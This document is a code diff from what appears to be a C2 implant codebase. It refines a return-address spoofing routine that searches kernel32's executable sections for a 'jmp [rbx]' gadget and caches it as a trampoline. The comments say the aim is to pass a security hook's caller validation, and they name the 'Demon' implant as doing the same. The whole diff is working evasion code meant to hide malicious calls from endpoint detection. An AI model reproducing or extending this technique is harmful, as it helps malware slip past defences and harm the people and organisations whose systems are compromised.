@@ -12,14 +12,21 @@
 extern PVOID Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, PVOID, PVOID );
 
 /* Gadget host: kernel32 — the most universally "trusted" module for a hook's
- * caller validation (Demon uses it too). Resolved once at startup. */
+ * caller validation (Demon uses it too). The `jmp [rbx]` gadget is located
+ * once at init and cached. Only executable sections are searched: FF 23 can
+ * appear as a data coincidence in .rdata, which executes fine on stock
+ * Windows RX mappings but faults under stricter loaders (Wine maps .rdata
+ * read-only), and a code-section gadget is the more robust choice anyway. */
 static PVOID g_SpoofModule = NULL;
 static ULONG g_SpoofSize   = 0;
+static PVOID g_SpoofGadget = NULL;
 
 VOID SpoofInit( VOID )
 {
     PIMAGE_DOS_HEADER Dos;
     PIMAGE_NT_HEADERS Nt;
+    PIMAGE_SECTION_HEADER Sec;
+    ULONG i;
 
     g_SpoofModule = GetModuleHandleA( "kernel32" );
     if ( ! g_SpoofModule )
@@ -34,22 +41,40 @@ VOID SpoofInit( VOID )
         goto FAIL;
 
     g_SpoofSize = Nt->OptionalHeader.SizeOfImage;
+    Sec         = IMAGE_FIRST_SECTION( Nt );
 
-    /* one probe: without a usable `jmp [rbx]` gadget we just call directly */
-    if ( ! MmGadgetFind( ( PUCHAR ) g_SpoofModule + 0x1000, ( SIZE_T ) g_SpoofSize - 0x1000, ( PUCHAR ) "\xFF\x23", 2 ) )
+    for ( i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
+        SIZE_T Start, Size;
+
+        if ( !( Sec[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
+            continue;
+
+        Start = Sec[ i ].VirtualAddress;
+        Size  = Sec[ i ].Misc.VirtualSize ? Sec[ i ].Misc.VirtualSize : Sec[ i ].SizeOfRawData;
+        if ( Start + Size > g_SpoofSize )
+            Size = g_SpoofSize - Start;
+
+        g_SpoofGadget = MmGadgetFind( ( PUCHAR ) g_SpoofModule + Start, Size, ( PUCHAR ) "\xFF\x23", 2 );
+        if ( g_SpoofGadget )
+            break;
+    }
+
+    /* without a usable `jmp [rbx]` gadget we just call directly */
+    if ( ! g_SpoofGadget )
         goto FAIL;
 
-    Dbg( "SpoofInit: kernel32 gadget available at module base %p (size %x)\n", g_SpoofModule, g_SpoofSize );
+    Dbg( "SpoofInit: kernel32 gadget at %p (module base %p)\n", g_SpoofGadget, g_SpoofModule );
     return;
 
 FAIL:
     g_SpoofModule = NULL;
     g_SpoofSize   = 0;
+    g_SpoofGadget = NULL;
 }
 
 BOOL SpoofReady( VOID )
 {
-    return g_SpoofModule != NULL;
+    return g_SpoofGadget != NULL;
 }
 
 PVOID MmGadgetFind( PVOID Memory, SIZE_T Length, PVOID PatternBuffer, SIZE_T PatternLength )
@@ -79,14 +104,11 @@ PVOID SpoofRetAddr( PVOID Function,
 {
     PRM Param = { 0 };
 
-    if ( ! Function || ! g_SpoofModule || g_SpoofSize <= 0x1000 )
+    if ( ! Function || ! g_SpoofGadget )
         return NULL;
 
-    /* the probe at init already proved a gadget exists; re-locate it (it is
-     * stable for the lifetime of the process, this just finds the first hit) */
-    Param.Trampoline = MmGadgetFind( ( PUCHAR ) g_SpoofModule + 0x1000, ( SIZE_T ) g_SpoofSize - 0x1000, ( PUCHAR ) "\xFF\x23", 2 );
-    if ( ! Param.Trampoline )
-        return NULL;
+    /* cached at init: a stable, executable `jmp [rbx]` inside kernel32 */
+    Param.Trampoline = g_SpoofGadget;
 
     Param.Function = Function;
     /* Param.Rbx is filled in by the trampoline */
